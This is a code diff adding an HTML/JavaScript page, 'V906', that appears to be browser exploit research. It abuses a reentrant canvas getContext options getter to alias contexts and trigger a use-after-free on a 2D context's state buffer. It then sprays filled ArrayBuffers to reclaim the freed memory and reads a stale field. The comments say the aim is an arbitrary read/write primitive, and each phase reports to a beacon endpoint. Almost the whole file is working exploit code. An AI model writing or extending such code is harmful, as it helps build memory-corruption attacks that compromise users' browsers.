@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V906</title></head>
+<body><pre id="out">V906 — state-buffer orphan test (which trigger frees B1, and does an AB take it?)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<40;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V906-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+
+/*
+ * V906: does the out-of-line stateStack buffer (B1, 6400B) become AB-reclaimable
+ * after a ctx-free trigger, with the stale wrapper still reading through it?
+ * If yes, filling the AB with a known double should surface as stale.lineWidth
+ * (the state entry's lineWidth field) -> the arb-R/W oracle is born with no
+ * absolute addresses involved.
+ *
+ * One trigger per WebProcess (localStorage round-robin):
+ *   t0: second getContext('bitmaprenderer', reentrant opts) on the same canvas
+ *   t1: canvas.remove() (ctx dies with element; stale wrapper survives)
+ *   t2: control — realloc path only (B1 freed but ctx uses B2; read must stay
+ *       normal 7777.7 -> verifies the harness itself)
+ * Each run: p553 alias -> save x15 (B1) -> trigger -> AB(6400) all-fill spray
+ * -> read stale.lineWidth once.
+ * ?r=1 resets the trigger counter.
+ */
+
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/V906-'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var FILL = 4321.7654;
+
+var trig = 0;
+try {
+  if (location.search.indexOf('r=1') >= 0) localStorage.setItem('v906_trig', '0');
+  trig = parseInt(localStorage.getItem('v906_trig')) || 0;
+} catch(e) {}
+b('BOOT trig=' + trig);
+
+/* PHASE 1: p553 alias */
+var canvas = document.createElement('canvas');
+canvas.width = 1; canvas.height = 1;
+document.body.appendChild(canvas);
+var innerCtx = null;
+var uafOpts = {};
+Object.defineProperty(uafOpts, 'alpha', {get: function() {
+  innerCtx = canvas.getContext('2d');
+  innerCtx.lineWidth = 55555.5;
+  return true;
+}});
+var bmr = canvas.getContext('bitmaprenderer', uafOpts);
+var aliasIdx = -1;
+var spray = [];
+if (innerCtx) {
+  for (var s = 0; s < 300; s++) {
+    var sc = document.createElement('canvas'); sc.width = 1; sc.height = 1;
+    document.body.appendChild(sc);
+    var cx = sc.getContext('2d');
+    spray.push(cx);
+    if (aliasIdx < 0 && cx && cx.lineWidth === 55555.5) aliasIdx = s;
+  }
+}
+b('P1 alias=' + aliasIdx);
+if (aliasIdx < 0) { b('DEAD no-alias'); }
+else {
+  /* PHASE 2: grow stateStack -> B1 (6400B) */
+  for (var i = 0; i < 15; i++) { innerCtx.save(); innerCtx.lineWidth = 1000 + i; }
+  b('P2 grown lw=' + innerCtx.lineWidth);
+
+  /* PHASE 3: trigger (round-robin) */
+  if (trig === 0) {
+    var o2 = {};
+    var fired2 = false;
+    Object.defineProperty(o2, 'alpha', {get: function() {
+      if (!fired2) { fired2 = true; try { canvas.getContext('2d'); } catch(e){} }
+      return true;
+    }});
+    var bmr2 = null;
+    try { bmr2 = canvas.getContext('bitmaprenderer', o2); } catch(e) { b('T0-THREW ' + e.name); }
+    b('T0 bmr2=' + (bmr2 ? 'OK' : 'NULL') + ' fired=' + fired2);
+  } else if (trig === 1) {
+    if (canvas.parentNode) canvas.parentNode.removeChild(canvas);
+    canvas = null;
+    for (var g = 0; g < 50; g++) { var junk = new ArrayBuffer(4096); }
+    b('T1 removed');
+  } else {
+    innerCtx.save();
+    innerCtx.lineWidth = 7777.7;
+    b('T2 realloc lw=' + innerCtx.lineWidth);
+  }
+
+  /* PHASE 4: AB(6400) all-fill spray */
+  var abs = [];
+  for (var a = 0; a < 200; a++) {
+    var ab = new ArrayBuffer(6400);
+    var dv = new DataView(ab);
+    for (var o = 0; o < 6400; o += 8) dv.setFloat64(o, FILL, true);
+    abs.push(ab);
+  }
+  b('P4 abspray n=' + abs.length);
+
+  /* PHASE 5: the read — sync beacon before, then read */
+  b('P5-PRE');
+  var lw = null;
+  try { lw = innerCtx.lineWidth; } catch (e) { lw = 'ERR:' + e.name; }
+  b('P5 lw=' + lw);
+
+  if (typeof lw === 'number') {
+    if (Math.abs(lw - FILL) < 0.01) b('VERDICT state-buffer-controlled (fill surfaced!)');
+    else if (lw >= 1000 && lw <= 1100) b('VERDICT state-intact marker=' + lw);
+    else if (Math.abs(lw - 7777.7) < 0.01) b('VERDICT state-intact realloc-value');
+    else if (Math.abs(lw - 55555.5) < 0.01) b('VERDICT state-intact base');
+    else b('VERDICT other lw=' + lw);
+  } else {
+    b('VERDICT crashed-or-err (read never returned)');
+  }
+}
+
+try { localStorage.setItem('v906_trig', String((trig + 1) % 3)); } catch(e) {}
+</script></body></html>
